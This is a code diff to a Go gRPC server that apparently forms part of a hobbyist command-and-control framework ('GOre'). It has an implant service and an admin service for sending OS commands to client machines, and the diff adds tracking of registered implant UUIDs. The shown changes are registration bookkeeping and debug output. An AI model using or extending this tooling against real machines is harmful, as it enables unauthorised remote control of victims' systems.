@@ -11,10 +11,17 @@ import (
 	"google.golang.org/grpc"
 )
 
+// empty array for UUID storage
+var uuid_list = []string{}
+
+// empty slice of implant server structs.
+var implant_list = []*implantServer{}
+
 /*It should be said, I think that these commands are invoked automatically, based on the RPC that was recieved, as the server decides what to do and when to do it. We don't invoke these explicitly, yet they are invoked.*/
 // create a struct for handling commands
 type implantServer struct {
 	work, output chan *grpcapi.Command //create a new thread to handle commands, in Golang this is defined by the "chan" type or "channel".
+	uuid         string                //store UUID strings to be indexable
 }
 
 // we need to have a seperate admin struct for handling admin commands, that way we don't run OS commands on the server, only on clients
@@ -23,7 +30,7 @@ type adminServer struct {
 	//uuid         chan *grpcapi.Registration //myabe??
 }
 
-// we impliment thse sepertaly to keep them mutally exclusive. Each one has a a channel for sending/recieving work and command output.
+// we impliment these sepertaly to keep them mutally exclusive. Each one has a a channel for sending/recieving work and command output.
 func NewImplantServer(work, output chan *grpcapi.Command) *implantServer { //returns a pointer to implant server
 	s := new(implantServer) //instantiate a struct of implantServer, name it s
 	s.work = work           //assign work
@@ -36,8 +43,7 @@ func NewAdminServer(work, output chan *grpcapi.Command) *adminServer { //returns
 	s := new(adminServer) //instantiate a struct of implantServer, name it s
 	s.work = work         //assign work
 	s.output = output     //assign output
-	//s.uuid = uuid         //testing this out
-	return s //return the struct.
+	return s              //return the struct.
 }
 
 // ctx is part of the built-in golang package "context", it is used for the creation/handling of API calls, without shitting the bed when multiple calls are made at the same time like
@@ -81,11 +87,22 @@ func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*gr
 // handle UUID
 func (s *implantServer) RegisterNewImplant(ctx context.Context, uuid_result *grpcapi.Registration) (*grpcapi.Empty, error) {
 	//var res *grpcapi.Registration
-	res := uuid_result.GetUuid() //this is a function....
+	res := uuid_result.GetUuid()
+	//debug print statement to server
 	uuidstr := fmt.Sprintf("%s", res)
-	fmt.Println(res) //this works, but prints the Hex/memory not the value as a string, I think...
+	fmt.Println(res)
 	fmt.Println(uuidstr)
 	fmt.Println("[+] Recieved new registration request")
+	//add uuid to the list that we have.
+	uuid_list = append(uuid_list, uuidstr)
+	implant_list = append(implant_list, s)
+	//try printing the data to make sure it actually went the wqay that was expected
+	fmt.Println("[+] Printing lists of registerd UUID's and implants:")
+	fmt.Printf("%+q", uuid_list)
+	fmt.Printf("%+q", implant_list)
+
+	//now, we have to add this to a database, or in this case an in-memeory array or something as a placeholder.
+	//return nil as I don't want to return something to the client.
 	return &grpcapi.Empty{}, nil
 }
 
@@ -103,6 +120,12 @@ func main() {
 		opts                           []grpc.ServerOption   //server options
 		work, output                   chan *grpcapi.Command //work and output goroutines
 	)
+
+	//TODO: create array for storing UUID's and another for a client list
+	//empty array for UUID storage
+	//uuid_list := []string{}
+	//empty slice of implant server structs.
+	//var implant_list = []implantServer{}
 	//TODO: load file and read TLS data
 
 	//create channels for passing input and output commands to implant and admin services
@@ -120,6 +143,7 @@ func main() {
 		fmt.Println("[-] adminListener has failed.")
 		log.Fatal(err)
 	}
+	fmt.Println("[+] GOre server has started successfully.")
 	//the "..." operator implies an input with a variable number of inputs, kinda like explicit function overloading. We declare that opts might have more variables associated with them than we specify.
 	grpcAdminServer, grpcImplantServer := grpc.NewServer(opts...), grpc.NewServer(opts...)
 	//register the servers. Do note we never explicitly defined these, protoc did. By compiling our .proto file, it gave us Golang functions for fri.
